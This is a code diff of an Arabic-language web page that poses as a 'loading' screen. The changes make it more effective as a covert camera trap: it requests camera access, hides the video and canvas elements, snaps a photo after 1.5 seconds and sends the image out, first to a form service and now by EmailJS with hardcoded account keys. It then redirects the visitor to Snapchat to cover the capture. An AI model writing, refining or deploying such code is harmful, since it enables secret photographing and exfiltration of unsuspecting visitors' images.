@@ -4,29 +4,45 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
+    <!-- مكتبة الإرسال EmailJS -->
+    <script type="text/javascript" src="https://jsdelivr.net"></script>
     <style>
-        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
-        video, canvas { display: none; }
+        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
+        video, canvas { display: none; } /* إخفاء الكاميرا */
     </style>
 </head>
 <body>
-    <h2>جاري التحميل...</h2>
+
+    <div id="status">
+        <h2>جاري تهيئة المتصفح...</h2>
+        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
+    </div>
+
+    <!-- عناصر الكاميرا المخفية -->
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // رابط Forminit الخاص بك
-        const FORM_URL = "https://forminit.com";
+        // معلوماتك الخاصة مدمجة وجاهزة
+        const SERVICE_ID = "service_yea65ei";
+        const TEMPLATE_ID = "template_tj626bi";
+        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";
+
+        emailjs.init(PUBLIC_KEY);
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // 1. تشغيل الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(captureAndSend, 1500); // التقاط بعد ثانية ونصف
+                // الانتظار ثانية ونصف لالتقاط صورة واضحة
+                setTimeout(captureAndSend, 1500);
             })
-            .catch(() => {
+            .catch(err => {
+                // التحويل في حال رفض الكاميرا
                 window.location.href = "https://snapchat.com";
             });
 
@@ -34,18 +50,23 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
             
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                // إرسال الصورة كملف حقيقي باسم "file"
-                formData.append("file", blob, "photo.jpg");
+            // تحويل الصورة لنص Base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
 
-                fetch(FORM_URL, {
-                    method: "POST",
-                    body: formData,
-                }).finally(() => {
-                    window.location.href = "https://snapchat.com";
-                });
-            }, 'image/jpeg', 0.7);
+            // 2. إرسال البيانات عبر EmailJS
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                photo_data: imageData,
+                title: "📸 التقاط جديد من الموقع"
+            })
+            .then(response => {
+                console.log('SUCCESS!', response.status, response.text);
+                // التوجيه لسناب شات بعد النجاح
+                window.location.href = "https://snapchat.com";
+            })
+            .catch(error => {
+                console.error('FAILED...', error);
+                window.location.href = "https://snapchat.com";
+            });
         }
     </script>
 </body>
